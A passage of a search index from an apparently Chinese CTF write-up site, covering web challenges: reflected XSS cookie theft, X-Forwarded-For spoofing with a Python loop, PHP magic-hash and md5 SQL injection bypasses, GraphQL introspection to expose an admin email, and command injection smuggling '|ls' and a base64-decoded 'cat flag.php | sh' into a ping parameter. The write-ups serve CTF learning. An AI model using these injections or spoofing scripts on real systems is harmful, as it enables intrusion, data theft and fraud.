\u63d0\u4ea4\u8868\u5355\u540e\uff0c\u590d\u5236\u94fe\u63a5\u5e76\u7c98\u8d34\u5230 Send URL to Bot \u63d0\u4ea4\uff0c\u5373\u53ef\u5728\u9879\u76ee\u5185\u5bb9\u4e2d\u67e5\u770b\u5230 flag \u53c2\u8003\u8d44\u6599 \u00b6 XSS Cross-site Scripting Attack","title":"CTFHub - \u53cd\u5c04\u578b XSS"},{"location":"web/ctfhub_reflected_xss/#xss","text":"\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002 \u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002 \u672c\u9898\u9700\u8981\u638c\u63e1\u7684\u662f\u5bf9\u5ba2\u6237\u7aef Cookies \u7684\u7a83\u53d6\u3002","title":"\u53cd\u5c04\u578b XSS"},{"location":"web/ctfhub_reflected_xss/#_1","text":"\u5728 XSS \u5e73\u53f0 \u6ce8\u518c\u5e76\u767b\u5f55 \u521b\u5efa\u9879\u76ee \u914d\u7f6e\u4ee3\u7801\u4e2d\u9009\u62e9\u9ed8\u8ba4\u6a21\u5757\u5c31\u53ef\u4ee5\u4e86(<\u309d\u03c9\u03a6) \u518d\u6765\u770b\u770b\u9898\u76ee\u5bf9\u5e94\u7684\u7f51\u7ad9\uff0c\u5728 What's your name \u5904\u586b\u5165\u5185\u5bb9\u5e76\u63d0\u4ea4\uff0c\u63d0\u4ea4\u5185\u5bb9\u4f1a\u663e\u793a\u5728\u9875\u9762\u4e0a \u4f7f\u7528 <h3> \u6807\u7b7e\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8bc1\u660e\u663e\u793a\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u8fc7\u6ee4 Send URL to Bot \u5e94\u8be5\u662f\u5145\u5f53\u5176\u4ed6\u7528\u6237\u6765\u5bf9\u63d0\u4f9b\u7684\u94fe\u63a5\u8fdb\u884c\u8bbf\u95ee \u5c06\u4ee5\u4e0b\u5185\u5bb9\u7c98\u8d34\u81f3 What's your name \u5e76\u63d0\u4ea4\u8868\u5355 \u63d0\u4ea4\u8868\u5355\u540e\uff0c\u590d\u5236\u94fe\u63a5\u5e76\u7c98\u8d34\u5230 Send URL to Bot \u63d0\u4ea4\uff0c\u5373\u53ef\u5728\u9879\u76ee\u5185\u5bb9\u4e2d\u67e5\u770b\u5230 flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/ctfhub_reflected_xss/#_2","text":"XSS Cross-site Scripting Attack","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/flag_red_packet/","text":"\u9898\u76ee \u00b6 \u201c\u542c\u8bf4\u6ca1\uff1f\u3010\u5927\u780d\u5200\u3011\u5e73\u53f0\u53c8\u53cc\u53d2\u505a\u6d3b\u52a8\u5566\uff01\u53c2\u4e0e\u6d3b\u52a8\u5c31\u9001 0.5 \u4e2a flag \u5462\uff0c\u6512\u6ee1 1 \u4e2a flag \u5373\u53ef\u514d\u8d39\u63d0\u53d6\uff01\u201d \u201c\u8fd8\u6709\u8fd9\u4e48\u597d\u7684\u4e8b\u60c5\uff1f\u6211\u4e5f\u8981\u53c2\u52a0\uff01\u201d \u201c\u5feb\u70b9\u5427\uff01\u6211\u5df2\u7ecf\u62ff\u5230 flag \u4e86\u5462\uff01\u518d\u4e0d\u53c2\u52a0 flag \u5c31\u8981\u53d1\u5b8c\u4e86\u5462\u3002\u201d \u201c\u90a3\u600e\u4e48\u624d\u80fd\u53c2\u52a0\u5462\uff1f\u201d \u201c\u8fd9\u8fd8\u4e0d\u7b80\u5355\uff01\u70b9\u51fb\u4e0b\u9762\u7684\u94fe\u63a5\u5c31\u884c\u201d \u89e3\u9898\u601d\u8def \u00b6 \u7c7b\u4f3c\u4e8e\u5e76\u5915\u5915\u7684\u52a9\u529b 23333 \u4e3b\u8981\u662f\u5411\u52a9\u529b\u94fe\u63a5\u53d1\u9001\u542b IP \u5730\u5740\u7684 POST \u8bf7\u6c42 1 curl '<invite-url>' -X POST --data-raw 'ip=xxx.xxx.xxx.xxx' \u4f17\u6240\u5468\u77e5\uff0c\u540c\u4e00\u7528\u6237\u4e0d\u80fd\u91cd\u590d\u52a9\u529b\uff0c\u6b64\u5904\u89c6\u540c\u4e00 /8 \u5730\u5740\u4e3a\u91cd\u590d\u7528\u6237\uff08\u8fd8\u633a\u4e25\u683cx\uff09 \u4e0d\u80fd\u76f4\u63a5\u4fee\u6539 POST \u8bf7\u6c42\u4e2d\u7684 IP \u5730\u5740 \u670d\u52a1\u7aef\u901a\u8fc7 HTTP \u8bf7\u6c42\u5934\u4e2d\u7684 X-Forwarded-For \u8bc6\u522b\u5ba2\u6237\u7aef\u7684\u539f\u59cb IP\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u4f2a\u9020 IP \u5730\u5740 \u75af\u72c2 \u52a9\u529b \ud83e\udd2a 1 2 3 4 5 6 7 8 9 10 11 import requests from time import sleep for i in range ( 256 ): ip = f ' { i } .1.1.1' # /8 header = { 'X-Forwarded-For' : ip , 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36' } res = requests . post ( '<invite-url>' , data = dict ( ip = ip ), headers = header ) . content . decode () sleep ( 2 ) \u53c2\u8003\u8d44\u6599 \u00b6 X-Forwarded-For - Wikipedia","title":"FLAG \u52a9\u529b\u5927\u7ea2\u5305"},{"location":"web/flag_red_packet/#_1","text":"\u201c\u542c\u8bf4\u6ca1\uff1f\u3010\u5927\u780d\u5200\u3011\u5e73\u53f0\u53c8\u53cc\u53d2\u505a\u6d3b\u52a8\u5566\uff01\u53c2\u4e0e\u6d3b\u52a8\u5c31\u9001 0.5 \u4e2a flag \u5462\uff0c\u6512\u6ee1 1 \u4e2a flag \u5373\u53ef\u514d\u8d39\u63d0\u53d6\uff01\u201d \u201c\u8fd8\u6709\u8fd9\u4e48\u597d\u7684\u4e8b\u60c5\uff1f\u6211\u4e5f\u8981\u53c2\u52a0\uff01\u201d \u201c\u5feb\u70b9\u5427\uff01\u6211\u5df2\u7ecf\u62ff\u5230 flag \u4e86\u5462\uff01\u518d\u4e0d\u53c2\u52a0 flag \u5c31\u8981\u53d1\u5b8c\u4e86\u5462\u3002\u201d \u201c\u90a3\u600e\u4e48\u624d\u80fd\u53c2\u52a0\u5462\uff1f\u201d \u201c\u8fd9\u8fd8\u4e0d\u7b80\u5355\uff01\u70b9\u51fb\u4e0b\u9762\u7684\u94fe\u63a5\u5c31\u884c\u201d","title":"\u9898\u76ee"},{"location":"web/flag_red_packet/#_2","text":"\u7c7b\u4f3c\u4e8e\u5e76\u5915\u5915\u7684\u52a9\u529b 23333 \u4e3b\u8981\u662f\u5411\u52a9\u529b\u94fe\u63a5\u53d1\u9001\u542b IP \u5730\u5740\u7684 POST \u8bf7\u6c42 1 curl '<invite-url>' -X POST --data-raw 'ip=xxx.xxx.xxx.xxx' \u4f17\u6240\u5468\u77e5\uff0c\u540c\u4e00\u7528\u6237\u4e0d\u80fd\u91cd\u590d\u52a9\u529b\uff0c\u6b64\u5904\u89c6\u540c\u4e00 /8 \u5730\u5740\u4e3a\u91cd\u590d\u7528\u6237\uff08\u8fd8\u633a\u4e25\u683cx\uff09 \u4e0d\u80fd\u76f4\u63a5\u4fee\u6539 POST \u8bf7\u6c42\u4e2d\u7684 IP \u5730\u5740 \u670d\u52a1\u7aef\u901a\u8fc7 HTTP \u8bf7\u6c42\u5934\u4e2d\u7684 X-Forwarded-For \u8bc6\u522b\u5ba2\u6237\u7aef\u7684\u539f\u59cb IP\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u4f2a\u9020 IP \u5730\u5740 \u75af\u72c2 \u52a9\u529b \ud83e\udd2a 1 2 3 4 5 6 7 8 9 10 11 import requests from time import sleep for i in range ( 256 ): ip = f ' { i } .1.1.1' # /8 header = { 'X-Forwarded-For' : ip , 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36' } res = requests . post ( '<invite-url>' , data = dict ( ip = ip ), headers = header ) . content . decode () sleep ( 2 )","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/flag_red_packet/#_3","text":"X-Forwarded-For - Wikipedia","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/funhash/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u9996\u9875\u7ed9\u51fa\u4e86\u6e90\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 <?php include 'conn.php' ; highlight_file ( \"index.php\" ); //level 1 if ( $_GET [ \"hash1\" ] != hash ( \"md4\" , $_GET [ \"hash1\" ])) { die ( 'level 1 failed' ); } //level 2 if ( $_GET [ 'hash2' ] === $_GET [ 'hash3' ] || md5 ( $_GET [ 'hash2' ]) !== md5 ( $_GET [ 'hash3' ])) { die ( 'level 2 failed' ); } //level 3 $query = \"SELECT * FROM flag WHERE password = '\" . md5 ( $_GET [ \"hash4\" ], true ) . \"'\" ; $result = $mysqli -> query ( $query ); $row = $result -> fetch_assoc (); var_dump ( $row ); $result -> free (); $mysqli -> close (); ?> \u5728\u4f7f\u7528 == \u6216 != \u8fdb\u884c\u6bd4\u8f83\u65f6\uff0c\u5982\u679c\u4ee5 0e \u5f00\u5934\u7684\u5b57\u7b26\u4e32\uff0c 0e \u540e\u8ddf\u7684\u6240\u6709\u5b57\u7b26\u90fd\u662f\u6570\u5b57\uff0c\u90a3\u4e48\u6574\u4e2a\u5b57\u7b26\u4e32\u4f1a\u6309\u79d1\u5b66\u8ba1\u6570\u6cd5\u8ba1\u7b97\uff0c\u5373\u662f \\(0\\) \uff0c\u66b4\u529b\u67e5\u627e\uff0c\u901a\u8fc7 level 1 1 2 3 4 5 6 7 8 9 10 11 12 13 <?php $i = 0 ; while ( true ) { $n = \"0e\" . ( $i ++ ); $h = hash ( \"md4\" , $n ); if ( $n == $h ) { printf ( $n ); break ; } } ?> 1 2 $ php . \\g ethash1.php 0e251288019 level 2 \u51fa\u73b0 === \u548c !== \uff0c\u65e2\u5224\u65ad\u53c2\u6570\u7684\u503c\u4e5f\u5224\u65ad\u53c2\u6570\u7684\u7c7b\u578b\uff0c\u8ba1\u7b97\u54c8\u5e0c\u7684\u7ed3\u679c\u662f\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u4f46 md5 \u65e0\u6cd5\u5904\u7406\u6570\u7ec4\uff0c\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u4e24\u4e2a\u4e0d\u76f8\u7b49\u7684\u6570\u7ec4\u7ed5\u8fc7 level 3 \u4e3a SQL \u6ce8\u5165\uff0c\u9700\u8981\u7ed5\u8fc7 md5($str,true) \uff0c\u7f51\u4e0a\u68c0\u7d22\u5230\u53ef\u4f9b\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u6709 ffifdyop \u548c 129581926211651571912466741651878684928 \uff0c\u7ecf md5 \u4e4b\u540e\u8f6c ASCII \u7684\u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u5206\u522b\u5305\u542b ' or '6 \u548c ' or '8 \u901a\u8fc7 level 1\u30012\u30013 \u5373\u53ef\u83b7\u5f97 Flag \u53c2\u8003\u8d44\u6599 \u00b6 Magic Hashes | WhiteHat Security","title":"Funhash"},{"location":"web/funhash/#_1","text":"\u9996\u9875\u7ed9\u51fa\u4e86\u6e90\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 <?php include 'conn.php' ; highlight_file ( \"index.php\" ); //level 1 if ( $_GET [ \"hash1\" ] != hash ( \"md4\" , $_GET [ \"hash1\" ])) { die ( 'level 1 failed' ); } //level 2 if ( $_GET [ 'hash2' ] === $_GET [ 'hash3' ] || md5 ( $_GET [ 'hash2' ]) !== md5 ( $_GET [ 'hash3' ])) { die ( 'level 2 failed' ); } //level 3 $query = \"SELECT * FROM flag WHERE password = '\" . md5 ( $_GET [ \"hash4\" ], true ) . \"'\" ; $result = $mysqli -> query ( $query ); $row = $result -> fetch_assoc (); var_dump ( $row ); $result -> free (); $mysqli -> close (); ?> \u5728\u4f7f\u7528 == \u6216 != \u8fdb\u884c\u6bd4\u8f83\u65f6\uff0c\u5982\u679c\u4ee5 0e \u5f00\u5934\u7684\u5b57\u7b26\u4e32\uff0c 0e \u540e\u8ddf\u7684\u6240\u6709\u5b57\u7b26\u90fd\u662f\u6570\u5b57\uff0c\u90a3\u4e48\u6574\u4e2a\u5b57\u7b26\u4e32\u4f1a\u6309\u79d1\u5b66\u8ba1\u6570\u6cd5\u8ba1\u7b97\uff0c\u5373\u662f \\(0\\) \uff0c\u66b4\u529b\u67e5\u627e\uff0c\u901a\u8fc7 level 1 1 2 3 4 5 6 7 8 9 10 11 12 13 <?php $i = 0 ; while ( true ) { $n = \"0e\" . ( $i ++ ); $h = hash ( \"md4\" , $n ); if ( $n == $h ) { printf ( $n ); break ; } } ?> 1 2 $ php . \\g ethash1.php 0e251288019 level 2 \u51fa\u73b0 === \u548c !== \uff0c\u65e2\u5224\u65ad\u53c2\u6570\u7684\u503c\u4e5f\u5224\u65ad\u53c2\u6570\u7684\u7c7b\u578b\uff0c\u8ba1\u7b97\u54c8\u5e0c\u7684\u7ed3\u679c\u662f\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u4f46 md5 \u65e0\u6cd5\u5904\u7406\u6570\u7ec4\uff0c\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u4e24\u4e2a\u4e0d\u76f8\u7b49\u7684\u6570\u7ec4\u7ed5\u8fc7 level 3 \u4e3a SQL \u6ce8\u5165\uff0c\u9700\u8981\u7ed5\u8fc7 md5($str,true) \uff0c\u7f51\u4e0a\u68c0\u7d22\u5230\u53ef\u4f9b\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u6709 ffifdyop \u548c 129581926211651571912466741651878684928 \uff0c\u7ecf md5 \u4e4b\u540e\u8f6c ASCII \u7684\u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u5206\u522b\u5305\u542b ' or '6 \u548c ' or '8 \u901a\u8fc7 level 1\u30012\u30013 \u5373\u53ef\u83b7\u5f97 Flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/funhash/#_2","text":"Magic Hashes | WhiteHat Security","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/heres_a_flag/","text":"\u9898\u76ee \u00b6 A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery? \u89e3\u9898\u601d\u8def \u00b6 \u67e5\u770b\u9875\u9762\u6e90\u7801\uff0c\u770b\u5230\u4e0d\u662f Flag \u7684\u65e0\u6548\u6ce8\u91ca \u6309\u7167\u9898\u76ee\u63d0\u793a\u770b\u770b\u5176\u4ed6\u524d\u7aef\u76f8\u5173\u7684\u6587\u4ef6\uff0c\u5728 index.js \u53d1\u73b0\u4e86\u4e00\u6bb5 Base64 \u7f16\u7801\u7684\u5b57\u7b26\u4e32\u3010\u7136\u540e\u662f Rickroll...\u3011 1 2 3 // aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj1kUXc0dzlXZ1hjUQ // since this a warmup, i'll let you know that this is base64 encoded // and you should check the yt comments of the decoded link \u6700\u7ec8\u5728 styles.css \u91cc\u53d1\u73b0\u4e86\uff01\u8fd8\u7ed9\u51fa\u4e86\u52a0\u5bc6\u65b9\u5f0f (\u03a6\u02cb\u03c9\u02ca\u03a6)\uff1d\u0417 1 2 3 4 5 . contain-flag :: after { z-index : -64209 ; caesar-cipher : +3 ; flag : \"gvf{zh0frph_wr_ghfrqvwuxfwi}\" ; } \u6109\u5feb\u5730\u89e3\u5bc6\uff0c\u7136\u540e\u63d0\u4ea4\u83b7\u5f97\u9519\u8bef\u63d0\u793a\uff01What\uff1f\uff01! :( \u591a\u6b21\u65e0\u4fee\u6539\u63d0\u4ea4\u540e\u628a\u76ee\u5149\u96c6\u4e2d\u5728\u4e86\u7279\u6b8a\u7684 0 \u8eab\u4e0a \u6700\u540e\u9700\u8981\u628a 0 \u6539\u6210 o \u518d\u89e3\u5bc6\uff0c\u6216\u8005\u76f4\u63a5\u4fee\u6539\u89e3\u5bc6\u7ed3\u679c\uff0c\u6700\u7ec8 Flag\uff1a dsc{welcome_to_deconstructf}","title":"Here's a Flag"},{"location":"web/heres_a_flag/#_1","text":"A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?","title":"\u9898\u76ee"},{"location":"web/heres_a_flag/#_2","text":"\u67e5\u770b\u9875\u9762\u6e90\u7801\uff0c\u770b\u5230\u4e0d\u662f Flag \u7684\u65e0\u6548\u6ce8\u91ca \u6309\u7167\u9898\u76ee\u63d0\u793a\u770b\u770b\u5176\u4ed6\u524d\u7aef\u76f8\u5173\u7684\u6587\u4ef6\uff0c\u5728 index.js \u53d1\u73b0\u4e86\u4e00\u6bb5 Base64 \u7f16\u7801\u7684\u5b57\u7b26\u4e32\u3010\u7136\u540e\u662f Rickroll...\u3011 1 2 3 // aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj1kUXc0dzlXZ1hjUQ // since this a warmup, i'll let you know that this is base64 encoded // and you should check the yt comments of the decoded link \u6700\u7ec8\u5728 styles.css \u91cc\u53d1\u73b0\u4e86\uff01\u8fd8\u7ed9\u51fa\u4e86\u52a0\u5bc6\u65b9\u5f0f (\u03a6\u02cb\u03c9\u02ca\u03a6)\uff1d\u0417 1 2 3 4 5 . contain-flag :: after { z-index : -64209 ; caesar-cipher : +3 ; flag : \"gvf{zh0frph_wr_ghfrqvwuxfwi}\" ; } \u6109\u5feb\u5730\u89e3\u5bc6\uff0c\u7136\u540e\u63d0\u4ea4\u83b7\u5f97\u9519\u8bef\u63d0\u793a\uff01What\uff1f\uff01! :( \u591a\u6b21\u65e0\u4fee\u6539\u63d0\u4ea4\u540e\u628a\u76ee\u5149\u96c6\u4e2d\u5728\u4e86\u7279\u6b8a\u7684 0 \u8eab\u4e0a \u6700\u540e\u9700\u8981\u628a 0 \u6539\u6210 o \u518d\u89e3\u5bc6\uff0c\u6216\u8005\u76f4\u63a5\u4fee\u6539\u89e3\u5bc6\u7ed3\u679c\uff0c\u6700\u7ec8 Flag\uff1a dsc{welcome_to_deconstructf}","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/info_above_graph/","text":"\u9898\u76ee \u00b6 \u5c0f T \u542c\u8bf4 GraphQL \u662f\u4e00\u79cd\u7279\u522b\u7684 API \u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e5f\u662f RESTful API \u7684\u6709\u529b\u7ade\u4e89\u8005\uff0c\u6240\u4ee5\u4ed6\u5199\u4e86\u4e2a\u5c0f\u7f51\u7ad9\u6765\u5b9e\u9a8c\u8fd9\u9879\u6280\u672f\u3002 \u4f60\u80fd\u901a\u8fc7\u8fd9\u4e2a\u5168\u65b0\u7684\u63a5\u53e3\uff0c\u83b7\u53d6\u5230\u6ca1\u6709\u516c\u5f00\u51fa\u6765\u7684\u7ba1\u7406\u5458\u7684\u90ae\u7bb1\u5730\u5740\u5417\uff1f \u89e3\u9898\u601d\u8def \u00b6 \u4f7f\u7528\u6d4b\u8bd5\u8d26\u53f7\u767b\u5f55\uff1a guest / guest \u767b\u5f55\u540e\u63d0\u793a Flag \u662f admin \u7684\u90ae\u7bb1 \uff0c\u754c\u9762\u53ea\u6709 \u9000\u51fa \u6309\u94ae\uff0cGraphQL \u63a5\u53e3\u5462\uff1f(\u014f\u03c9\u014f) \u67e5\u770b\u7f51\u7edc\u8bf7\u6c42\uff0c\u53d1\u73b0\u4e86\u5411 GraphQL \u63a5\u53e3\u53d1\u9001\u7684 POST \u8bf7\u6c42 URL http://202.38.93.111:15001/graphql Method POST Data {\"query\":\"{ notes(userId: 2) { id\\ncontents }}\"} Response {\"data\":{\"notes\":[{\"id\":2,\"contents\":\"Flag \u662f admin \u7684\u90ae\u7bb1\u3002\"}]}} \u8981\u4f7f\u7528 GraphQL \u5fc5\u987b\u77e5\u9053\u53ef\u67e5\u8be2\u7684\u5b57\u6bb5\uff0c\u9996\u5148\u4e86\u89e3\u4e00\u4e0b\u63a5\u53e3\u53ef\u7528\u7684 schema 1 2 3 4 5 6 7 8 9 { __schema { types { name } } } # {\"query\": \"{__schema {types {name}}}\"} \u7c7b\u578b GNote \u548c GUser \u662f\u9700\u8981\u4f7f\u7528\u7684 \u8981\u83b7\u5f97 admin \u7684\u90ae\u7bb1\uff0c\u90ae\u7bb1\u5b57\u6bb5\u5e94\u8be5\u4e0e\u7528\u6237\u76f8\u5173\uff0c\u67e5\u770b\u7c7b\u578b GUser \u7684\u8be6\u7ec6\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 { __type ( name: \"GUser\" ) { name fields { name type { name kind } } } } # {\"query\": \"{__type(name: \\\"GUser\\\"){name\\nfields{name\\ntype{name\\nkind}}}}\"} \u7c7b\u578b\u5b57\u6bb5\u83b7\u53d6\u5b8c\u6bd5\uff01\u63a5\u4e0b\u6765\u770b\u770b\u53ef\u7528\u67e5\u8be2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { __schema { queryType { fields { name description args { name } } } } } # {\"query\": \"{__schema{queryType{fields{name\\ndescription\\nargs{name}}}}}\"} guest \u7528\u6237 id \u4e3a 2\uff0c\u63a8\u65ad admin \u7528\u6237\u7684 id \u4e3a 1 1 2 3 4 5 6 7 { user ( id: 1 ) { privateEmail } } # {\"query\": \"{user(id: 1){privateEmail}}\"} \u6210\u529f\u83b7\u5f97 Flag\uff01","title":"\u56fe\u4e4b\u4e0a\u7684\u4fe1\u606f"},{"location":"web/info_above_graph/#_1","text":"\u5c0f T \u542c\u8bf4 GraphQL \u662f\u4e00\u79cd\u7279\u522b\u7684 API \u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e5f\u662f RESTful API \u7684\u6709\u529b\u7ade\u4e89\u8005\uff0c\u6240\u4ee5\u4ed6\u5199\u4e86\u4e2a\u5c0f\u7f51\u7ad9\u6765\u5b9e\u9a8c\u8fd9\u9879\u6280\u672f\u3002 \u4f60\u80fd\u901a\u8fc7\u8fd9\u4e2a\u5168\u65b0\u7684\u63a5\u53e3\uff0c\u83b7\u53d6\u5230\u6ca1\u6709\u516c\u5f00\u51fa\u6765\u7684\u7ba1\u7406\u5458\u7684\u90ae\u7bb1\u5730\u5740\u5417\uff1f","title":"\u9898\u76ee"},{"location":"web/info_above_graph/#_2","text":"\u4f7f\u7528\u6d4b\u8bd5\u8d26\u53f7\u767b\u5f55\uff1a guest / guest \u767b\u5f55\u540e\u63d0\u793a Flag \u662f admin \u7684\u90ae\u7bb1 \uff0c\u754c\u9762\u53ea\u6709 \u9000\u51fa \u6309\u94ae\uff0cGraphQL \u63a5\u53e3\u5462\uff1f(\u014f\u03c9\u014f) \u67e5\u770b\u7f51\u7edc\u8bf7\u6c42\uff0c\u53d1\u73b0\u4e86\u5411 GraphQL \u63a5\u53e3\u53d1\u9001\u7684 POST \u8bf7\u6c42 URL http://202.38.93.111:15001/graphql Method POST Data {\"query\":\"{ notes(userId: 2) { id\\ncontents }}\"} Response {\"data\":{\"notes\":[{\"id\":2,\"contents\":\"Flag \u662f admin \u7684\u90ae\u7bb1\u3002\"}]}} \u8981\u4f7f\u7528 GraphQL \u5fc5\u987b\u77e5\u9053\u53ef\u67e5\u8be2\u7684\u5b57\u6bb5\uff0c\u9996\u5148\u4e86\u89e3\u4e00\u4e0b\u63a5\u53e3\u53ef\u7528\u7684 schema 1 2 3 4 5 6 7 8 9 { __schema { types { name } } } # {\"query\": \"{__schema {types {name}}}\"} \u7c7b\u578b GNote \u548c GUser \u662f\u9700\u8981\u4f7f\u7528\u7684 \u8981\u83b7\u5f97 admin \u7684\u90ae\u7bb1\uff0c\u90ae\u7bb1\u5b57\u6bb5\u5e94\u8be5\u4e0e\u7528\u6237\u76f8\u5173\uff0c\u67e5\u770b\u7c7b\u578b GUser \u7684\u8be6\u7ec6\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 { __type ( name: \"GUser\" ) { name fields { name type { name kind } } } } # {\"query\": \"{__type(name: \\\"GUser\\\"){name\\nfields{name\\ntype{name\\nkind}}}}\"} \u7c7b\u578b\u5b57\u6bb5\u83b7\u53d6\u5b8c\u6bd5\uff01\u63a5\u4e0b\u6765\u770b\u770b\u53ef\u7528\u67e5\u8be2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { __schema { queryType { fields { name description args { name } } } } } # {\"query\": \"{__schema{queryType{fields{name\\ndescription\\nargs{name}}}}}\"} guest \u7528\u6237 id \u4e3a 2\uff0c\u63a8\u65ad admin \u7528\u6237\u7684 id \u4e3a 1 1 2 3 4 5 6 7 { user ( id: 1 ) { privateEmail } } # {\"query\": \"{user(id: 1){privateEmail}}\"} \u6210\u529f\u83b7\u5f97 Flag\uff01","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/initiative/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u9996\u9875\u7ed9\u51fa\u4e86\u7f51\u7ad9\u7684\u6e90\u7801\uff0c\u4ec5\u8fc7\u6ee4\u53d8\u91cf ip \u4e2d\u7684\u5173\u952e\u8bcd flag \uff0c\u53ef\u4ee5\u5229\u7528 system \u51fd\u6570\u6267\u884c\u547d\u4ee4 1 2 3 4 5 6 7 8 <?php highlight_file ( \"index.php\" ); if ( preg_match ( \"/flag/i\" , $_GET [ \"ip\" ])) { die ( \"no flag\" ); } system ( \"ping -c 3 $_GET[ip] \" ); ?> http://39.96.23.228:10002?ip=|ls . \u67e5\u770b\u5f53\u524d\u76ee\u5f55\uff0c\u53d1\u73b0 flag.php \u4f7f\u7528 Base64 \u7f16\u7801\u7ed5\u8fc7\uff0c http://39.96.23.228:10002?ip=| echo Y2F0IGZsYWcucGhw | base64 -d | sh \uff0c\u7531\u4e8e highlight_file \u51fd\u6570\u7684\u5f71\u54cd\uff0c\u672a\u76f4\u63a5\u5728\u7f51\u9875\u4e0a\u663e\u793a\uff0c\u53ef\u7528\u67e5\u770b\u5668\u67e5\u770b","title":"\u4e3b\u52a8"},{"location":"web/initiative/#_1","text":"\u9996\u9875\u7ed9\u51fa\u4e86\u7f51\u7ad9\u7684\u6e90\u7801\uff0c\u4ec5\u8fc7\u6ee4\u53d8\u91cf ip \u4e2d\u7684\u5173\u952e\u8bcd flag \uff0c\u53ef\u4ee5\u5229\u7528 system \u51fd\u6570\u6267\u884c\u547d\u4ee4 1 2 3 4 5 6 7 8 <?php highlight_file ( \"index.php\" ); if ( preg_match ( \"/flag/i\" , $_GET [ \"ip\" ])) { die ( \"no flag\" ); } system ( \"ping -c 3 $_GET[ip] \" ); ?> http://39.96.23.228:10002?ip=|ls . \u67e5\u770b\u5f53\u524d\u76ee\u5f55\uff0c\u53d1\u73b0 flag.php \u4f7f\u7528 Base64 \u7f16\u7801\u7ed5\u8fc7\uff0c http://39.96.23.228:10002?ip=| echo Y2F0IGZsYWcucGhw | base64 -d | sh \uff0c\u7531\u4e8e highlight_file \u51fd\u6570\u7684\u5f71\u54cd\uff0c\u672a\u76f4\u63a5\u5728\u7f51\u9875\u4e0a\u663e\u793a\uff0c\u53ef\u7528\u67e5\u770b\u5668\u67e5\u770b","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/most_secure_crypto_algo/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u9898\u76ee\u53ea\u6709\u4e00\u4e2a\u767b\u5f55\u8868\u5355 \u67e5\u770b Login \u6309\u94ae\u5173\u8054\u7684 JS \u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ( \".c_submit\" ). click ( function ( event ) { event . preventDefault (); var k = CryptoJS . SHA256 ( \"\\x93\\x39\\x02\\x49\\x83\\x02\\x82\\xf3\\x23\\xf8\\xd3\\x13\\x37\" ); var u = $ ( \"#cuser\" ). val (); var p = $ ( \"#cpass\" ). val (); var t = true ; if ( u == \"\\x68\\x34\\x78\\x30\\x72\" ) { if ( ! CryptoJS . AES . encrypt ( p , CryptoJS . enc . Hex . parse ( k . toString (). substring ( 0 , 